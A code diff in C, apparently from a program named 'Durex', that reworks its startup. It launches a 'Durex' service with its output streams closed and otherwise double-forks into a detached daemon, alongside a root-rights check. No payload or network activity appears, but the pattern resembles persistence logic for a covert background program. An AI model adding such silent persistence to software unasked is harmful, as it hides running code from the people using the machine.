@@ -41,11 +41,36 @@ const char *get_login()
 int		start_daemon(int argc, char **argv)
 {
 	(void)argc;
+	pid_t	pid = fork();
+	if (pid == 0) {
+		int sid = setsid();
+		if (sid > 0) {
+			pid_t new_pid = fork();
+			if (new_pid == 0) {
+				durex_daemon(argv[0]);
+			} else if (new_pid > 0) {
+				exit(0);
+			}
+		} else {
+			exit(-1);
+		}
+	} else if (pid < 0) {
+		return (-1);
+	}
+	return (0);
+}
+
+int		start_service(int argc, char **argv)
+{
+	(void)argc;
 	(void)argv;
-	char *const args[] = {"/usr/bin/Durex", " ", NULL};
+	char *const args[] = {"/usr/sbin/service", "Durex", "start", NULL};
 	char *const env[] = { NULL };
 
 	if (fork() == 0) {
+		close(0);
+		close(1);
+		close(2);
 		execve(args[0], args, env);
 		exit(0);
 	}
@@ -74,9 +99,9 @@ int		build_daemon(int argc, char **argv)
 		return (0);
 	if (strcmp(argv[0], "/usr/bin/Durex") != 0)
 	{
-		return (start_daemon(argc, argv));
+		return (start_service(argc, argv));
 	}
-	return (durex_daemon(argv[0]));
+	return (start_daemon(argc, argv));
 }
 
 int		has_root_rights(void)
